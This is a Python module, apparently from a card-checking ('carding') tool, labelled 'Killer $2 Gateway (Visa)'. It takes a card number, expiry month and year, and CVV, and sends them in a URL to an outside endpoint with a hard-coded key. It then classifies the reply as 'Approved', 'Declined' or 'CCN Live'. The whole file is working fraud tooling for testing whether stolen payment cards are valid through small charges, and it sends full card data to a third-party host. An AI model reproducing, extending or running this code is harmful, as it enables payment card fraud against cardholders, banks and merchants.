"""
Killer $2 Gateway (Visa)
API Endpoint: https://killervisa.onrender.com/kill/key=diwazz
"""
import aiohttp
import asyncio
import json

async def killer2_check(cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    Killer Visa charge gateway
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
    
    Returns:
        dict: {'status': str, 'response': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint
    api_url = f"https://killervisa.onrender.com/kill/key=diwazz/cc={full_card}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=60)
            ) as resp:
                api_response = await resp.text()
                
                # Parse JSON response
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    # Parse as text
                    if "approved" in api_response.lower() or "charged" in api_response.lower():
                        return {
                            'status': 'Approved',
                            'response': api_response[:200]
                        }
                    elif "declined" in api_response.lower():
                        return {
                            'status': 'Declined',
                            'response': api_response[:200]
                        }
                    else:
                        return {
                            'status': 'Unknown',
                            'response': api_response[:200]
                        }
                
                # Extract data
                status = data.get("status", "Unknown")
                response = data.get("response", "No response")
                message = data.get("message", response)
                
                # Determine final status
                if isinstance(status, str):
                    lower_status = status.lower()
                    if "approved" in lower_status or "charged" in lower_status or "success" in lower_status:
                        final_status = "Approved"
                    elif "declined" in lower_status or "failed" in lower_status:
                        final_status = "Declined"
                    elif "ccn" in lower_status or "live" in lower_status:
                        final_status = "CCN Live"
                    else:
                        final_status = status
                else:
                    final_status = "Unknown"
                
                return {
                    'status': final_status,
                    'response': message or response
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Unknown',
            'response': 'API request timed out'
        }
    except Exception as e:
        return {
            'status': 'Unknown',
            'response': f'Error: {str(e)}'
        }
